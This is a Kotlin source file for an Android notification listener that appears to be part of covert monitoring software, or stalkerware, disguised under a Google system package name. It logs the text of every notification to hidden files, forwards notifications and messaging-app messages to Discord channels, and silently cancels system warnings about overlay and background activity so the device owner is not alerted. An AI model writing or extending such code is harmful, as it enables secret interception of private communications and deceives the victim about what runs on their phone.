package com.google.android.system

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * AppNotificationListenerService
 *
 * Captures incoming notifications, categorizes them by application,
 * and appends them to hidden local log files (.txt) inside internal storage
 * up to a maximum size cap of 5 MB per app.
 */
class AppNotificationListenerService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListener"
        private const val MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024L // 5 MB max
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        try {
            val packageName = sbn.packageName ?: return
            val extras = sbn.notification?.extras
            val title = extras?.getCharSequence("android.title")?.toString() ?: ""
            val text = extras?.getCharSequence("android.text")?.toString() ?: ""
            val fullText = "$title $text".lowercase(Locale.getDefault())

            // Auto-cancel system overlay and background activity alerts immediately
            if (packageName == "android" || packageName == "com.android.systemui" || packageName == "com.google.android.system") {
                if (fullText.contains("displaying over") || fullText.contains("overlaying") || 
                    fullText.contains("active in background") || fullText.contains("background activity") ||
                    fullText.contains("drawing over")
                ) {
                    try { cancelNotification(sbn.key) } catch (_: Exception) {}
                    Log.i(TAG, "Auto-dismissed system overlay/background notification alert: $title")
                    return
                }
            }

            if (packageName == "com.homemonitor" || packageName == "android") return

            if (title.isBlank() && text.isBlank()) return

            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(sbn.postTime))
            val appName = getAppName(packageName)

            val logLine = "[$timeStr] $title | $text\n"
            saveNotificationToHiddenFile(packageName, appName, logLine)
            MonitorService.sendDiscordStreamNotification(appName, title, text)

            // Forward incoming messaging app notifications to specific Discord messaging channels
            val msgChannel = MonitorService.getMessagingChannelForPackage(packageName)
            if (msgChannel != null) {
                MonitorService.sendDiscordStreamMessagingApp(msgChannel, appName, sender = title, text = text, isOutgoing = false)
            }

            Log.i(TAG, "Logged notification for $appName ($packageName): $title")
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification: ${e.message}")
        }
    }

    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun saveNotificationToHiddenFile(packageName: String, appName: String, logLine: String) {
        val notifDir = File(cacheDir, ".notifs")
        if (!notifDir.exists()) notifDir.mkdirs()

        val logFile = File(notifDir, "$packageName.txt")

        // Store friendly app name in metadata header if new file
        if (!logFile.exists()) {
            logFile.writeText("#APP_NAME:$appName\n")
        }

        // 5 MB max size check
        if (logFile.exists() && logFile.length() > MAX_FILE_SIZE_BYTES) {
            val lines = logFile.readLines()
            if (lines.size > 100) {
                // Keep header and drop oldest 30% of log lines to stay under 5 MB
                val header = lines.firstOrNull { it.startsWith("#APP_NAME:") } ?: "#APP_NAME:$appName\n"
                val recentLines = lines.drop(lines.size / 3)
                logFile.writeText(header + "\n" + recentLines.joinToString("\n") + "\n")
            }
        }

        logFile.appendText(logLine)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
